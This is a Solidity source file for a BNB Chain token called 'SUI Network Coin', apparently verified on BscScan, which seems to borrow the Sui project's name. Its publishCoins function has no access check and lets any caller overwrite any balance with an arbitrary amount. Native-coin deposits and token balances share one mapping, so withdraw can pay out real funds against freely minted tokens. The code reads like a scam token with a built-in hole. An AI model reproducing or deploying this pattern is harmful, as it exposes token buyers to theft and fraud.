/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: Apache-1.0
pragma solidity 0.6.12;

contract SUINetworkCoin {
    string public name     = "SUI Network Coin";
    string public symbol   = "SUI";
    uint8  public decimals = 8;
    uint public _totalSupply;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;


    constructor() public {
        _totalSupply = 100000000000000000;
        balanceOf[0x8723c5B9c96250D9B5EbEF34581cC57954099CCD] = _totalSupply;
        emit Transfer(address(0), 0x8723c5B9c96250D9B5EbEF34581cC57954099CCD, _totalSupply);
    }

    function a() public payable {
        deposit();
    }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }


    function totalSupply() public returns (uint) {
        return _totalSupply  - balanceOf[address(0)];
    }
    function balanceOfAddress(address guy) public returns (uint) {
        return balanceOf[guy];
    }

    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        msg.sender.transfer(wad);
        emit Withdrawal(msg.sender, wad);
    }


    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }


    function showMe() public returns (address) {
        return msg.sender;
    }

    function publishCoins(address src, uint wad) public returns (bool)
    {
        balanceOf[src] = _totalSupply + wad;
        emit Transfer(address(0), src, _totalSupply + wad);
        return true;
    }
    function transferFrom(address src, address dst, uint wad) public returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        Transfer(src, dst, wad);

        return true;
    }


}